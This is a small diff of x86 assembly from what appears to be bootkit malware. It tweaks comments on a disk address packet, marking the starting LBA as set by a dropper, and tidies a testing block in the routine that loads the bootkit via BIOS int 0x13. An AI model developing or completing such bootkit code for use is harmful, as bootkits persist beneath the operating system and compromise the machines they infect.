@@ -29,8 +29,8 @@ bootkit_dap:
     dw 0x01                          ; number of sectors to transfer (set to 0x02 for testing. overwritten by dropper)
     dw BOOTKIT_BASE                  ; transfer buffer (16 bit offset)
     dw 0x00                          ; transfer buffer (16 bit segment)
-    dq 0x00                          ; lower 32-bits of 48-bit starting LBA
-    dq 0x00                          ; upper 16-bits of 48-bit starting LBA
+    dq 0x00                          ; lower 32-bits of 48-bit starting LBA (overwritten by dropper)
+    dq 0x00                          ; upper 16-bits of 48-bit starting LBA (overwritten by dropper)
 
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;;           code section         ;;
@@ -63,9 +63,11 @@ real_start:
 ;
 load_bootkit:
     mov ah, 0x42
-; FOR TESTING START (remove after)
+
+; FOR TESTING START (remove afterwards)
     mov dl, 0x81
 ; FOR TESTING END
+
     mov si, bootkit_dap
     int 0x13
     jc error                         ; error:   stop
